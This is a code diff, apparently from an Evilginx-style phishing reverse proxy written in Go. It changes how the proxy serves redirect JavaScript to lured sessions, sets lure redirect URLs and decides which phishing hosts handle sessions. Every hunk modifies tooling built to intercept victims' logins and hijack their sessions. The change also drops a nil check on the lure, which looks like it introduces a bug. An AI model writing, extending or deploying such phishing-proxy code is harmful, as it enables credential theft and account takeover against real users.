@@ -226,11 +226,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						session_id = session_id[:len(session_id)-3]
 						if s, ok := p.sessions[session_id]; ok {
 							var d_body string
-
-							if s.RedirectURL != "" {
-								dynamic_redirect_js := DYNAMIC_REDIRECT_JS
-								dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-								d_body += dynamic_redirect_js + "\n\n"
+							if !s.IsDone {
+								if s.RedirectURL != "" {
+									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
+									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
+									d_body += dynamic_redirect_js + "\n\n"
+								}
 							}
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
@@ -292,8 +293,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
 						}
 					} else {
-						log.Warning("session cookie not found: %s (%s) [%s]", req_url, remote_addr, pl.Name)
-
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
 
@@ -360,17 +359,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										log.Error("database: %v", err)
 									}
 
-									if l != nil {
-										session.RedirectURL = pl.RedirectUrl
-										if l.RedirectUrl != "" {
-											session.RedirectURL = l.RedirectUrl
-										}
-										if session.RedirectURL != "" {
-											session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
-										}
-										session.PhishLure = l
-										log.Debug("redirect URL (lure): %s", session.RedirectURL)
+									session.RedirectURL = pl.RedirectUrl
+									if l.RedirectUrl != "" {
+										session.RedirectURL = l.RedirectUrl
 									}
+									if session.RedirectURL != "" {
+										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
+									}
+									session.PhishLure = l
+									log.Debug("redirect URL (lure): %s", session.RedirectURL)
 
 									// set params from url arguments
 									p.extractParams(session, req.URL)
@@ -1684,10 +1681,7 @@ func (p *HttpProxy) handleSession(hostname string) bool {
 			}
 			for _, ph := range pl.proxyHosts {
 				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-					if ph.handle_session || ph.is_landing {
-						return true
-					}
-					return false
+					return true
 				}
 			}
 		}
